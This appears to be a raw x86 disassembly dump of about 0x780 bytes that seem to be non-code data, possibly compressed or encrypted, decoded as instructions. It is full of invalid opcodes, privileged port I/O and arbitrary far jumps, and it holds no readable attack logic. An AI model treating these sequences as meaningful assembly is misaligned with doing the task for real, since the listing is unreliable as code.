  41ab0f:	push   edi
  41ab10:	(bad)  
  41ab11:	sti    
  41ab12:	or     BYTE PTR [ebx+0x4e309eec],bh
  41ab18:	or     BYTE PTR [ecx+0x7f],al
  41ab1b:	cdq    
  41ab1c:	rol    BYTE PTR [eax],0x3e
  41ab1f:	scas   eax,DWORD PTR es:[edi]
  41ab20:	ret    
  41ab21:	mov    esi,0x1b7c685b
  41ab26:	lea    edx,[edi]
  41ab28:	dec    edi
  41ab29:	mov    edx,0xd327ebcf
  41ab2e:	mov    ebx,0x237acf1f
  41ab33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab34:	xchg   esi,eax
  41ab35:	(bad)  
  41ab36:	dec    esi
  41ab37:	enter  0x5908,0x58
  41ab3b:	rcr    DWORD PTR [ebx+ebx*4+0xb],1
  41ab3f:	inc    edx
  41ab40:	ret    0x8931
  41ab43:	sbb    al,BYTE PTR [ebx-0x56]
  41ab46:	sti    
  41ab47:	adc    BYTE PTR [ecx-0x1a],ah
  41ab4a:	cmp    BYTE PTR [eax+0x4d3f75c7],bh
  41ab50:	popf   
  41ab51:	mov    eax,ds:0x52d48728
  41ab56:	adc    al,0xcf
  41ab58:	xor    dl,BYTE PTR [edi-0x7c]
  41ab5b:	clc    
  41ab5c:	push   edi
  41ab5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab5e:	inc    ecx
  41ab5f:	jmp    DWORD PTR [ebx-0x1a]
  41ab62:	stc    
  41ab63:	ins    DWORD PTR es:[edi],dx
  41ab64:	pop    eax
  41ab65:	push   ss
  41ab66:	test   BYTE PTR [ebp-0x5b40ece1],0xb0
  41ab6d:	mov    edi,0xe16e3155
  41ab72:	aad    0x6a
  41ab74:	data16 shr BYTE PTR [edx-0x20],cl
  41ab78:	pop    ecx
  41ab79:	mul    DWORD PTR [esi+0x4b]
  41ab7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab7d:	jmp    0x2305c53c
  41ab82:	cmc    
  41ab83:	pop    edi
  41ab84:	imul   esi,DWORD PTR [edi+0x1c],0xffffffee
  41ab88:	mov    dh,0xd6
  41ab8a:	mov    al,ds:0x7d8a92a9
  41ab8f:	sbb    eax,0xc1f38b42
  41ab94:	adc    al,0xfd
  41ab96:	jmp    0x5f2a6b20
  41ab9b:	xchg   BYTE PTR [edi],dh
  41ab9d:	xor    BYTE PTR [edx-0x4d8e71dd],dh
  41aba3:	xchg   esi,eax
  41aba4:	retf   
  41aba5:	adc    al,BYTE PTR [edi+eiz*8-0x1f]
  41aba9:	xor    ecx,DWORD PTR [esi+eiz*4-0x7f]
  41abad:	sahf   
  41abae:	loopne 0x41abdf
  41abb0:	test   al,0xec
  41abb2:	xlat   BYTE PTR ds:[ebx]
  41abb3:	scas   al,BYTE PTR es:[edi]
  41abb4:	or     ecx,esp
  41abb6:	loope  0x41ab46
  41abb8:	lahf   
  41abb9:	out    0x3b,eax
  41abbb:	and    ebp,DWORD PTR [eax]
  41abbd:	jb     0x41ac16
  41abbf:	and    bl,BYTE PTR ds:0xfb5acdd
  41abc5:	adc    eax,0x16075cc6
  41abca:	lahf   
  41abcb:	mov    edi,DWORD PTR [ebp-0x1d91ad77]
  41abd1:	pushf  
  41abd2:	jg     0x41abe5
  41abd4:	pop    ds
  41abd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abd6:	data16 aaa 
  41abd8:	sub    al,0x24
  41abda:	call   0xb6d9:0xa24d4dcf
  41abe1:	out    0x20,al
  41abe3:	shr    DWORD PTR [edx+0x53],0xf2
  41abe7:	push   es
  41abe8:	loop   0x41ab8d
  41abea:	dec    eax
  41abeb:	pop    eax
  41abec:	into   
  41abed:	in     eax,dx
  41abee:	lds    edx,FWORD PTR [ebx-0x7e]
  41abf1:	test   al,al
  41abf3:	outs   dx,DWORD PTR ds:[esi]
  41abf4:	xchg   ebx,eax
  41abf5:	mov    edx,0xfa7c616
  41abfa:	stos   DWORD PTR es:[edi],eax
  41abfb:	cld    
  41abfc:	ret    
  41abfd:	and    BYTE PTR [ebp+0x71],bh
  41ac00:	(bad)  
  41ac01:	shl    BYTE PTR [ecx-0x221f2926],1
  41ac07:	loopne 0x41abb6
  41ac09:	inc    edi
  41ac0a:	dec    esi
  41ac0b:	push   ds
  41ac0c:	add    BYTE PTR [edx-0x3aca3414],ah
  41ac12:	inc    ecx
  41ac13:	jno    0x41ac5f
  41ac15:	adc    al,0xdf
  41ac17:	dec    ebp
  41ac18:	cmp    al,0x4f
  41ac1a:	out    0x3a,eax
  41ac1c:	mov    esp,0x60d91920
  41ac21:	and    eax,0x2e4ba492
  41ac26:	nop
  41ac27:	sub    BYTE PTR [edx-0x780c11f4],cl
  41ac2d:	popa   
  41ac2e:	outs   dx,BYTE PTR ds:[esi]
  41ac2f:	push   ebp
  41ac30:	in     al,dx
  41ac31:	fidiv  DWORD PTR [edi-0x65cda8c7]
  41ac37:	popf   
  41ac38:	fs pop edi
  41ac3a:	iret   
  41ac3b:	add    al,0x69
  41ac3d:	lds    esp,FWORD PTR [ebp-0x2b902f16]
  41ac43:	lock cmp BYTE PTR [eax+0x3],al
  41ac47:	jne    0x41acb3
  41ac49:	aam    0xa
  41ac4b:	ret    
  41ac4c:	jecxz  0x41ac24
  41ac4e:	loope  0x41ac63
  41ac50:	xchg   ebx,eax
  41ac51:	rcr    DWORD PTR [edi],1
  41ac53:	xor    al,0x6a
  41ac55:	(bad)  
  41ac56:	sahf   
  41ac57:	popf   
  41ac58:	enter  0x3105,0xf6
  41ac5c:	cld    
  41ac5d:	adc    esi,DWORD PTR [edi-0x3d]
  41ac60:	inc    esp
  41ac61:	add    ch,BYTE PTR [ebx+0x40]
  41ac64:	aam    0x10
  41ac66:	leave  
  41ac67:	call   0xd94c:0xea654518
  41ac6e:	push   cs
  41ac6f:	fs jecxz 0x41ac08
  41ac72:	sbb    al,0xa2
  41ac74:	xchg   ah,cl
  41ac76:	fld    DWORD PTR [edi+0x1a]
  41ac79:	cmp    DWORD PTR [ecx-0x9640cd],0xa21b6a4b
  41ac83:	mov    WORD PTR [eax],ds
  41ac85:	and    edi,DWORD PTR [ebx-0xabbeb34]
  41ac8b:	adc    DWORD PTR [eax-0x7e],ecx
  41ac8e:	nop
  41ac8f:	mov    ds:0xa6f88144,al
  41ac94:	cmp    al,0xfd
  41ac96:	adc    DWORD PTR ds:0xcf94c6f0,edi
  41ac9c:	mov    edx,0xb94574dd
  41aca1:	fcomp  QWORD PTR [ebp-0x1b591a81]
  41aca7:	pop    edi
  41aca8:	push   ds
  41aca9:	out    0x83,eax
  41acab:	mov    ds:0x7d727fb8,eax
  41acb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acb1:	imul   esp,DWORD PTR [ecx],0xffffffd9
  41acb4:	in     al,0xad
  41acb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acb7:	sbb    eax,0x4fc95e3d
  41acbc:	sbb    BYTE PTR [ebp-0x73],cl
  41acbf:	scas   al,BYTE PTR es:[edi]
  41acc0:	(bad)  
  41acc1:	mov    dl,0x35
  41acc3:	sar    BYTE PTR [ebp-0x30],0x71
  41acc7:	scas   eax,DWORD PTR es:[edi]
  41acc8:	xchg   esp,eax
  41acc9:	jns    0x41ac5a
  41accb:	imul   ecx,DWORD PTR [esi+0x74],0xa60466f
  41acd2:	sub    DWORD PTR [edi+0x4b],eax
  41acd5:	lea    edx,fs:[edi-0x49]
  41acd9:	inc    eax
  41acda:	shl    BYTE PTR [ebx+0x77c31ffa],cl
  41ace0:	mov    BYTE PTR [esi],ch
  41ace2:	sub    ah,dh
  41ace4:	sbb    BYTE PTR [ecx],dl
  41ace6:	popfw  
  41ace8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ace9:	(bad)
  41aced:	out    0xb5,al
  41acef:	cmc    
  41acf0:	outs   dx,BYTE PTR ds:[esi]
  41acf1:	out    dx,eax
  41acf2:	push   ss
  41acf3:	cmp    ebp,DWORD PTR [eax-0x6fe5ef3a]
  41acf9:	xor    al,0x8d
  41acfb:	cli    
  41acfc:	cmc    
  41acfd:	test   al,0xff
  41acff:	mov    ah,0x42
  41ad01:	lahf   
  41ad02:	xchg   esi,eax
  41ad03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad04:	popa   
  41ad05:	outs   dx,BYTE PTR ds:[esi]
  41ad06:	inc    eax
  41ad07:	fs into 
  41ad09:	test   BYTE PTR [ebx+0x1],0x64
  41ad0d:	sbb    esi,DWORD PTR [ebp+0x55059452]
  41ad13:	cmp    BYTE PTR [ebp-0x9f68e10],dl
  41ad19:	push   cs
  41ad1a:	sub    al,0xd3
  41ad1c:	outs   dx,BYTE PTR ds:[esi]
  41ad1d:	sub    DWORD PTR [edi-0x4c3b46a5],ebp
  41ad23:	mov    ds:0x13b571e6,al
  41ad28:	sub    DWORD PTR [ecx-0x568f2f82],ebx
  41ad2e:	pusha  
  41ad2f:	aas    
  41ad30:	add    ah,BYTE PTR [ebx]
  41ad32:	imul   ebx,DWORD PTR [ebx-0x7cfd8b53],0xffffffad
  41ad39:	out    dx,eax
  41ad3a:	jp     0x41ad7b
  41ad3c:	dec    ecx
  41ad3d:	dec    ecx
  41ad3e:	xlat   BYTE PTR ds:[ebx]
  41ad3f:	sbb    bl,BYTE PTR [eax+edi*2-0x29]
  41ad43:	inc    eax
  41ad44:	push   es
  41ad45:	sahf   
  41ad46:	dec    esp
  41ad47:	mov    ebp,0x86660225
  41ad4c:	jge    0x41ada1
  41ad4e:	fisub  WORD PTR [esi-0x40f2a441]
  41ad54:	xor    BYTE PTR [ecx],0x7d
  41ad57:	scas   eax,DWORD PTR es:[edi]
  41ad58:	and    bl,ah
  41ad5a:	jmp    0x3b37:0x79251485
  41ad61:	das    
  41ad62:	dec    edx
  41ad63:	jmp    0x41adde
  41ad65:	icebp  
  41ad66:	and    DWORD PTR [edx-0x328f458c],esp
  41ad6c:	(bad)  
  41ad6d:	mov    ds:0x52339701,eax
  41ad72:	ficom  WORD PTR [eax-0x6792c3b1]
  41ad78:	sub    ah,BYTE PTR [ebx-0x304644a8]
  41ad7e:	jnp    0x41ad10
  41ad80:	inc    esp
  41ad81:	push   0x93890530
  41ad86:	in     eax,dx
  41ad87:	call   0xe6c54aca
  41ad8c:	add    edi,DWORD PTR [edx]
  41ad8e:	cdq    
  41ad8f:	sub    al,0x20
  41ad91:	mov    al,0xe9
  41ad93:	jae    0x41ad2d
  41ad95:	jb     0x41ad43
  41ad97:	or     DWORD PTR [edi],esp
  41ad99:	idiv   dh
  41ad9b:	add    eax,0xee4c77d1
  41ada0:	ja     0x41ae11
  41ada2:	mov    ah,0x2f
  41ada4:	mul    BYTE PTR [edi+ecx*2]
  41ada7:	xchg   DWORD PTR [ecx+ecx*8+0x3822f13e],ebp
  41adae:	gs cs ja 0x41adf6
  41adb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adb3:	data16 mul BYTE PTR [edi]
  41adb6:	mov    WORD PTR [ebp+0xbe21d1d],fs
  41adbc:	ds pop ebp
  41adbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adbf:	imul   edi,ebp,0x63b0a1f1
  41adc5:	sbb    al,0x75
  41adc7:	and    eax,0x814ea746
  41adcc:	jmp    0x41ae1e
  41adce:	dec    ecx
  41adcf:	hlt    
  41add0:	xor    al,ah
  41add2:	dec    edi
  41add3:	add    al,0x42
  41add5:	dec    ebp
  41add6:	or     BYTE PTR [ecx],0x3
  41add9:	pusha  
  41adda:	icebp  
  41addb:	or     BYTE PTR [edx+0x7eda8cd0],0x10
  41ade2:	pop    ecx
  41ade3:	xor    BYTE PTR [edi],dh
  41ade5:	retf   0x91d6
  41ade8:	call   0x39a5:0xbd93e084
  41adef:	inc    esp
  41adf0:	xor    BYTE PTR [ebx-0x65e6dc87],cl
  41adf6:	pop    ds
  41adf7:	and    edi,ecx
  41adf9:	or     DWORD PTR [ecx+eax*2+0x56],eax
  41adfd:	jmp    0xc0a5:0x296497bf
  41ae04:	and    DWORD PTR [ecx],0x68
  41ae07:	mov    ecx,0x77daa7ab
  41ae0c:	enter  0x12f9,0x6f
  41ae10:	cld    
  41ae11:	or     DWORD PTR [esp+ebx*8+0x20966bd],0xb542b112
  41ae1c:	je     0x41ae0f
  41ae1e:	adc    eax,0x1236ad99
  41ae23:	mov    ebx,0x4703a0d0
  41ae28:	cs repz jmp 0x6fb090c2
  41ae2f:	outs   dx,BYTE PTR es:[esi]
  41ae31:	into   
  41ae32:	and    eax,0xa0cbe782
  41ae37:	jmp    0x67ee:0xfa02618f
  41ae3e:	daa    
  41ae3f:	aad    0x41
  41ae41:	fisubr WORD PTR [edi+0x5d]
  41ae44:	in     eax,dx
  41ae45:	(bad)  
  41ae46:	in     eax,0x0
  41ae48:	jne    0x41ae44
  41ae4a:	out    0x45,eax
  41ae4c:	fcom   QWORD PTR [esi]
  41ae4e:	xor    BYTE PTR [ecx-0x51],dh
  41ae51:	test   BYTE PTR [ecx+0x1c],bh
  41ae54:	inc    esi
  41ae55:	add    eax,0x3f
  41ae58:	or     DWORD PTR [esi+edi*2+0x60a372d],ebp
  41ae5f:	and    DWORD PTR [eax+0x65aef992],edx
  41ae65:	loope  0x41ae06
  41ae67:	and    esi,0x1fe53bf1
  41ae6d:	xor    BYTE PTR [ebp+0x3b],dh
  41ae70:	addr16 xor eax,0xce2f8ab4
  41ae76:	pop    ebx
  41ae77:	test   esp,esp
  41ae79:	sbb    ch,dl
  41ae7b:	and    eax,0x7f2b7457
  41ae80:	ret    
  41ae81:	xchg   edi,eax
  41ae82:	out    dx,al
  41ae83:	push   0x8ef80a4
  41ae88:	stos   DWORD PTR es:[edi],eax
  41ae89:	adc    eax,0xe1a30c8e
  41ae8e:	add    dh,cl
  41ae90:	ror    BYTE PTR [ebx+0x41],0xe9
  41ae94:	mov    esi,0x6dd86af5
  41ae99:	in     eax,0xfe
  41ae9b:	call   0x57dce09d
  41aea0:	lods   al,BYTE PTR ds:[esi]
  41aea1:	push   esi
  41aea2:	fidiv  WORD PTR [esi]
  41aea4:	call   0x5cd0:0xe31e7d23
  41aeab:	fcomp  DWORD PTR [edx-0x5]
  41aeae:	(bad)  
  41aeaf:	pslld  mm7,QWORD PTR [ecx]
  41aeb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeb3:	push   ds
  41aeb4:	add    eax,0xbb7951f
  41aeb9:	aam    0x72
  41aebb:	(bad)  
  41aebc:	jns    0x41af0a
  41aebe:	lods   al,BYTE PTR ds:[esi]
  41aebf:	clc    
  41aec0:	xor    eax,edi
  41aec2:	jge    0x41af0c
  41aec4:	push   0x27
  41aec6:	xor    eax,eax
  41aec8:	mov    ds:0x788f49b8,eax
  41aecd:	(bad)  
  41aece:	sub    bl,dh
  41aed0:	rol    DWORD PTR [esi+0x29142e84],cl
  41aed6:	add    eax,ecx
  41aed8:	mov    sp,0xf94d
  41aedc:	cli    
  41aedd:	sub    BYTE PTR [eax+0x8],ch
  41aee0:	das    
  41aee1:	sub    cl,bl
  41aee3:	xlat   BYTE PTR ds:[ebx]
  41aee4:	rcl    BYTE PTR [ecx-0x5aeb8371],1
  41aeea:	mov    bh,0xc6
  41aeec:	lea    edx,[esi+0x7a]
  41aeef:	jmp    0xd23d5fb
  41aef4:	sbb    bl,BYTE PTR [edi-0x7b94c5e9]
  41aefa:	rol    DWORD PTR [ebx+0x62],cl
  41aefd:	cmp    DWORD PTR [ebx+0x0],eax
  41af00:	mov    WORD PTR [ebx],cs
  41af02:	aas    
  41af03:	xchg   BYTE PTR [esi-0x35],al
  41af06:	dec    eax
  41af07:	cld    
  41af08:	cmp    esi,edx
  41af0a:	sub    BYTE PTR [ebx],bh
  41af0c:	jle    0x41aeef
  41af0e:	in     eax,0xac
  41af10:	add    DWORD PTR gs:[ebx],edx
  41af13:	mov    DWORD PTR [eax+eiz*2],esp
  41af16:	push   0x7
  41af18:	xlat   BYTE PTR ds:[ebx]
  41af19:	jl     0x41aea2
  41af1b:	and    DWORD PTR [bx+si+0x47e2],edi
  41af20:	or     esp,DWORD PTR [ecx-0x1c]
  41af23:	xchg   ecx,eax
  41af24:	ds pushf 
  41af26:	jo     0x41aec6
  41af28:	inc    ebp
  41af29:	arpl   WORD PTR [edx],si
  41af2b:	sub    ch,BYTE PTR [edi]
  41af2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af2e:	cmp    BYTE PTR [edi+ebx*2],bh
  41af31:	push   cs
  41af32:	mov    edx,0x84d1eedc
  41af37:	pop    eax
  41af38:	xlat   BYTE PTR ds:[ebx]
  41af39:	cmp    eax,0x1eddbc55
  41af3e:	jecxz  0x41afb9
  41af40:	sti    
  41af41:	push   0xe62f8f97
  41af46:	ds push ds
  41af48:	cs aaa 
  41af4a:	cmp    cl,BYTE PTR [edx]
  41af4c:	ins    DWORD PTR es:[edi],dx
  41af4d:	mov    ds:0xe46724e9,al
  41af52:	(bad)  
  41af53:	enter  0xe06a,0x35
  41af57:	mov    esp,0xc6a02e34
  41af5c:	sbb    ecx,DWORD PTR [ebx+0x59]
  41af5f:	or     bl,ah
  41af61:	jns    0x41af51
  41af63:	shl    BYTE PTR [edx*4-0x21986d1c],cl
  41af6a:	xor    BYTE PTR [edx+0x1686d3ac],bh
  41af70:	add    al,0xd4
  41af72:	mov    al,ds:0xf0f699c8
  41af77:	and    dh,BYTE PTR [edx-0x78d8ee4a]
  41af7d:	mov    al,ds:0xedb0b376
  41af82:	rol    DWORD PTR ds:0xfddea3bc,cl
  41af88:	and    ah,ah
  41af8a:	inc    ecx
  41af8b:	daa    
  41af8c:	mov    al,ds:0x66035836
  41af91:	mov    cl,0xed
  41af93:	fnstcw WORD PTR [ebx-0x26e5d3a6]
  41af99:	fild   QWORD PTR [ebp-0x5db2fd9c]
  41af9f:	ficomp DWORD PTR [ebp+0x7d791638]
  41afa5:	jge    0x41afc0
  41afa7:	pop    ebx
  41afa8:	cmp    BYTE PTR [eax],bl
  41afaa:	arpl   WORD PTR [esi+esi*8-0x2d],di
  41afae:	call   edi
  41afb0:	in     eax,0xa8
  41afb2:	pop    edx
  41afb3:	mov    dl,0xe7
  41afb5:	data16 sar BYTE PTR [eax-0x17],1
  41afb9:	fsub   st(3),st
  41afbb:	mov    ds:0xe53e7522,eax
  41afc0:	inc    esp
  41afc1:	cmp    al,0x57
  41afc3:	dec    eax
  41afc4:	jbe    0x41afb0
  41afc6:	mov    ch,0x71
  41afc8:	leave  
  41afc9:	or     al,0x26
  41afcb:	sub    al,0xf6
  41afcd:	les    esi,FWORD PTR ds:[ebp-0x17]
  41afd1:	xor    dl,ch
  41afd3:	ret    0x5e5
  41afd6:	dec    ebp
  41afd7:	ret    
  41afd8:	jmp    0x7b97:0x7d03e5a7
  41afdf:	xor    DWORD PTR [ebx],ecx
  41afe1:	pusha  
  41afe2:	sub    DWORD PTR [ebx+0x77f1566b],ecx
  41afe8:	sar    BYTE PTR ds:0x9dca7738,0x2e
  41afef:	jbe    0x41af83
  41aff1:	lahf   
  41aff2:	mov    eax,ds:0x797f12e3
  41aff7:	sub    ecx,DWORD PTR [edx]
  41aff9:	adc    eax,0x149c55bc
  41affe:	bound  ecx,QWORD PTR [ebx+0x8]
  41b001:	inc    ebp
  41b002:	mov    WORD PTR [ebp+0x1476b6e9],cs
  41b008:	mov    esi,0x13147769
  41b00d:	out    dx,al
  41b00e:	and    edi,DWORD PTR [eax-0x64]
  41b011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b012:	xchg   ebx,ebp
  41b014:	cmp    ch,BYTE PTR [ebx-0xa]
  41b017:	mov    dh,0xee
  41b019:	scas   al,BYTE PTR es:[edi]
  41b01a:	jmp    0x459d:0xad3ffe52
  41b021:	jae    0x41afed
  41b023:	(bad)  
  41b024:	stos   DWORD PTR es:[edi],eax
  41b025:	imul   esi,DWORD PTR [ebx+0x4b],0xdf77c940
  41b02c:	cli    
  41b02d:	mov    ecx,0x98f5b04a
  41b032:	aaa    
  41b033:	aam    0x4c
  41b035:	mov    bl,al
  41b037:	in     al,0xce
  41b039:	frstor [ebx+0x6d8a215a]
  41b03f:	inc    esp
  41b040:	inc    eax
  41b041:	bound  esi,QWORD PTR [edx-0x7e]
  41b044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b045:	jp     0x41b0bf
  41b047:	ficom  WORD PTR [edx]
  41b049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b04a:	leave  
  41b04b:	(bad)  
  41b04d:	push   edx
  41b04e:	daa    
  41b04f:	loop   0x41b01b
  41b051:	and    al,0x6b
  41b053:	aaa    
  41b054:	sub    eax,0x4bd86588
  41b059:	push   eax
  41b05a:	and    eax,0x31639f83
  41b05f:	add    dl,bh
  41b061:	jnp    0x41afe4
  41b063:	adc    cl,BYTE PTR [ecx-0x42293a84]
  41b069:	aam    0x5e
  41b06b:	add    esp,DWORD PTR [eax+0x7]
  41b06e:	add    al,0xd0
  41b070:	adc    bh,BYTE PTR [edi+esi*1+0x1b94446b]
  41b077:	aaa    
  41b078:	push   ecx
  41b079:	xchg   ebp,eax
  41b07a:	mov    esp,0x2011056e
  41b07f:	mov    esi,0x15a9c1f5
  41b084:	in     al,0x67
  41b086:	dec    esp
  41b087:	jns    0x41b0a6
  41b089:	ins    BYTE PTR es:[edi],dx
  41b08a:	call   0x235d:0xbdc9f1ee
  41b091:	xchg   edi,eax
  41b092:	out    0xcf,eax
  41b094:	test   DWORD PTR [esi-0x52],edx
  41b097:	mov    al,0xdb
  41b099:	jo     0x41b0a1
  41b09b:	outs   dx,DWORD PTR ds:[esi]
  41b09c:	mov    cl,bl
  41b09e:	pop    ebp
  41b09f:	or     DWORD PTR [edi-0x36],esp
  41b0a2:	and    BYTE PTR [ebx],ah
  41b0a4:	push   es
  41b0a5:	mov    esp,ds
  41b0a7:	loope  0x41b080
  41b0a9:	shr    BYTE PTR [edx+esi*4],cl
  41b0ac:	add    WORD PTR [ebp+0x19],dx
  41b0b0:	push   0xb320fca7
  41b0b5:	into   
  41b0b6:	cwde   
  41b0b7:	out    0xdc,eax
  41b0b9:	shl    DWORD PTR [esi],0xeb
  41b0bc:	outs   dx,BYTE PTR ds:[esi]
  41b0bd:	push   eax
  41b0be:	gs ins DWORD PTR es:[edi],dx
  41b0c0:	mov    ebx,ecx
  41b0c2:	test   al,0x59
  41b0c4:	int    0xf0
  41b0c6:	test   BYTE PTR [ebx+0x6b1d05ef],ch
  41b0cc:	inc    eax
  41b0cd:	sbb    eax,0x44e88ef9
  41b0d2:	adc    eax,0x93ac3901
  41b0d7:	pop    edi
  41b0d8:	xchg   esp,eax
  41b0d9:	in     al,dx
  41b0da:	dec    esp
  41b0db:	(bad)  
  41b0dc:	mov    edx,0x588d7a0
  41b0e1:	mov    ds:0x7629317c,al
  41b0e6:	cmp    edi,edi
  41b0e8:	in     eax,dx
  41b0e9:	or     BYTE PTR [esi-0x9],cl
  41b0ec:	data16 jmp 0x41b14e
  41b0ef:	pop    esi
  41b0f0:	pop    ebx
  41b0f1:	cmp    eax,0xdb1a535c
  41b0f6:	sbb    BYTE PTR [ebp-0x4f],bl
  41b0f9:	xor    esp,0xffffffc3
  41b0fc:	sub    al,0x56
  41b0fe:	(bad)  
  41b100:	mov    ds:0xd48ff34c,eax
  41b105:	sbb    ebx,DWORD PTR [ecx]
  41b107:	jmp    0x88cdc33a
  41b10c:	xchg   BYTE PTR [eax+0x7014c13c],dh
  41b112:	mov    eax,ds:0x963509a1
  41b117:	and    bl,bl
  41b119:	jo     0x41b129
  41b11b:	mov    ds:0xde3f357f,al
  41b120:	(bad)  
  41b121:	push   0x5562d49e
  41b126:	das    
  41b127:	out    dx,al
  41b128:	leave  
  41b129:	scas   al,BYTE PTR es:[edi]
  41b12a:	loop   0x41b12b
  41b12c:	pop    edx
  41b12d:	fcmovb st,st(4)
  41b12f:	aad    0x8f
  41b131:	mov    esi,0xc9a27710
  41b136:	inc    BYTE PTR [esi-0x33ac50cd]
  41b13c:	test   edx,ecx
  41b13e:	cdq    
  41b13f:	idiv   BYTE PTR [edi]
  41b141:	shr    BYTE PTR [eax+0x6f32f29d],cl
  41b147:	sti    
  41b148:	xchg   ebp,eax
  41b149:	adc    BYTE PTR [ecx-0x14],ah
  41b14c:	adc    al,0x8b
  41b14e:	xchg   ebp,eax
  41b14f:	push   eax
  41b150:	call   0x62140e5
  41b155:	pop    ds
  41b156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b157:	inc    edi
  41b158:	cmp    eax,0x39f71bdc
  41b15d:	push   esp
  41b15e:	stc    
  41b15f:	dec    edi
  41b160:	cmp    edi,DWORD PTR [ebp-0x58]
  41b163:	inc    ebx
  41b164:	cmp    al,0xa2
  41b166:	adc    BYTE PTR [esi],ch
  41b168:	ror    BYTE PTR [ecx],1
  41b16a:	jns    0x41b187
  41b16c:	or     ecx,DWORD PTR [esi]
  41b16e:	push   es
  41b16f:	mov    eax,ds:0x9f07297
  41b174:	lea    edx,[esi-0x70]
  41b177:	leave  
  41b178:	mov    ds:0x9f055fa1,eax
  41b17d:	call   0x33e251ed
  41b182:	mov    DWORD PTR [ebp+edx*4-0x30b1464a],eax
  41b189:	pop    edi
  41b18a:	lock fwait
  41b18c:	and    eax,0x2688a671
  41b191:	out    0xdd,ax
  41b194:	or     BYTE PTR ds:0x10e391db,bh
  41b19a:	cs pop ss
  41b19c:	sub    ebx,ebx
  41b19e:	jb     0x41b1ee
  41b1a0:	and    DWORD PTR [ebp-0x65],esi
  41b1a3:	sar    dl,cl
  41b1a5:	push   ecx
  41b1a6:	lds    ebx,FWORD PTR [ebx+0x24701f89]
  41b1ac:	jns    0x41b1e3
  41b1ae:	out    0xbc,eax
  41b1b0:	mov    al,0x36
  41b1b2:	xchg   edi,eax
  41b1b3:	inc    ebp
  41b1b4:	jmp    0x41b18b
  41b1b6:	out    dx,al
  41b1b7:	fs out 0xd6,eax
  41b1ba:	sbb    eax,0xc1595cd2
  41b1bf:	(bad)  
  41b1c0:	leave  
  41b1c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1c2:	jl     0x41b1ce
  41b1c4:	mov    ebx,ss
  41b1c6:	test   al,0xd4
  41b1c8:	adc    DWORD PTR [ecx],esi
  41b1ca:	or     DWORD PTR [esp+esi*4+0x79431a6e],edx
  41b1d1:	jbe    0x41b233
  41b1d3:	jecxz  0x41b1ff
  41b1d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1d6:	mov    bh,cl
  41b1d8:	cdq    
  41b1d9:	test   BYTE PTR [esi-0x2],al
  41b1dc:	ds push ds
  41b1de:	(bad)  
  41b1df:	xor    DWORD PTR [ebx],ebp
  41b1e1:	and    eax,0xce1af3ae
  41b1e6:	popa   
  41b1e7:	cmp    BYTE PTR [ecx],ah
  41b1e9:	fldcw  WORD PTR [edi+0x5f5f58a3]
  41b1ef:	(bad)  
  41b1f0:	out    dx,eax
  41b1f1:	out    0xfc,al
  41b1f3:	lock pop ecx
  41b1f5:	test   esi,0x4e89326
  41b1fb:	cmp    eax,0x7e0a0f45
  41b200:	mov    dh,0x38
  41b202:	xor    DWORD PTR [ecx],ebx
  41b204:	mov    dl,0xac
  41b206:	jle    0x41b21e
  41b208:	fisubr DWORD PTR [esi]
  41b20a:	sub    DWORD PTR [edi-0x7d03c612],edx
  41b210:	mov    esp,0xd4ebbfe5
  41b215:	jnp    0x41b256
  41b217:	pop    esp
  41b218:	pop    ss
  41b219:	(bad)  
  41b21a:	lods   eax,DWORD PTR ds:[esi]
  41b21b:	repz xor eax,0xb51bb51a
  41b221:	je     0x41b249
  41b223:	je     0x41b1e9
  41b225:	xchg   ebp,eax
  41b226:	mov    ch,0x55
  41b228:	sub    bh,BYTE PTR [edx+edx*2+0x37]
  41b22c:	sbb    BYTE PTR [ebp-0x4ca48463],cl
  41b232:	dec    eax
  41b233:	xor    al,0xae
  41b235:	bound  ebp,QWORD PTR [esi]
  41b237:	bound  ecx,QWORD PTR [ebx+0x58]
  41b23a:	push   ecx
  41b23b:	sub    BYTE PTR [ecx],dh
  41b23d:	mov    esp,0x389e88ed
  41b242:	outs   dx,DWORD PTR ds:[esi]
  41b243:	push   0xffffff8d
  41b245:	ret    
  41b246:	loop   0x41b1ff
  41b248:	cmp    dh,ch
  41b24a:	(bad)  
  41b24b:	ss pop edx
  41b24d:	adc    al,0xa0
  41b24f:	int3   
  41b250:	test   eax,0x57e9a587
  41b255:	or     DWORD PTR [esp+ecx*8+0x5b633a1b],ecx
  41b25c:	test   DWORD PTR [edx+0x3c],edx
  41b25f:	jno    0x41b246
  41b261:	push   edx
  41b262:	fdiv   DWORD PTR [edi+0x445efd49]
  41b268:	lea    eax,[esi-0x12]
  41b26b:	jg     0x41b1f6
  41b26d:	cdq    
  41b26e:	or     eax,0x42b5a355
  41b273:	sbb    ch,BYTE PTR [ecx]
  41b275:	iret   
  41b276:	sbb    DWORD PTR [ecx],ebx
  41b278:	and    dh,cl
  41b27a:	mov    esp,0x272c85b
  41b27f:	shr    ah,cl
  41b281:	xlat   BYTE PTR ds:[ebx]
  41b282:	mov    dl,0x88
  41b284:	jg     0x41b21b
  41b286:	pop    edx
  41b287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b288:	dec    esi
  41b289:	fild   QWORD PTR [edi]
  41b28b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b28c:	sub    DWORD PTR [ebx],ebp
  41b28e:	cmp    al,0x15
  41b290:	jp     0x41b271
